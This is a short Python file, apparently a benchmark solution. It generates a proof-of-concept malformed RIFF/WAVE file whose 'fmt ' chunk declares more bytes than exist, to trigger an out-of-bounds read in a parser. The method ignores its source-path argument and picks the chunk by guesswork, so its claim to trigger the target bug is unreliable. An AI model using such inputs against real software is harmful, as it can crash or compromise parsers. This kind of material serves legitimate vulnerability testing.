import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create a minimal RIFF file with malformed chunk that causes
        # out-of-bounds read by having data size exceed chunk boundaries
        # Format: RIFF header + chunk with size larger than remaining data
        
        # RIFF header (12 bytes)
        # 4 bytes: "RIFF"
        # 4 bytes: file size - 8 (little-endian)
        # 4 bytes: "WAVE" (form type)
        
        # Then a chunk with:
        # 4 bytes: chunk ID  
        # 4 bytes: chunk size (little-endian)
        # chunk data
        
        # We'll create a chunk that claims to have more data than exists
        # in the file, triggering the buffer overflow
        
        # Total file size: 58 bytes
        riff_header = b'RIFF'
        
        # File size: 58 - 8 = 50
        file_size = 50
        file_size_bytes = struct.pack('<I', file_size)  # little-endian
        
        form_type = b'WAVE'
        
        # Chunk ID - use something that will trigger the vulnerable code path
        # Based on typical RIFF vulnerabilities, often in "fmt " or "data" chunks
        chunk_id = b'fmt '
        
        # Set chunk size larger than remaining data in file
        # Remaining data after chunk header: 58 - 12 (RIFF header) - 8 (chunk header) = 38 bytes
        # But we claim to have 100 bytes, causing out-of-bounds read
        chunk_size = 100
        chunk_size_bytes = struct.pack('<I', chunk_size)
        
        # Create minimal chunk data (just enough to trigger the vulnerability)
        # This is the actual data that will be read
        # We'll use 38 bytes of arbitrary data
        chunk_data = b'A' * 38
        
        # Construct the complete PoC
        poc = riff_header + file_size_bytes + form_type + chunk_id + chunk_size_bytes + chunk_data
        
        return poc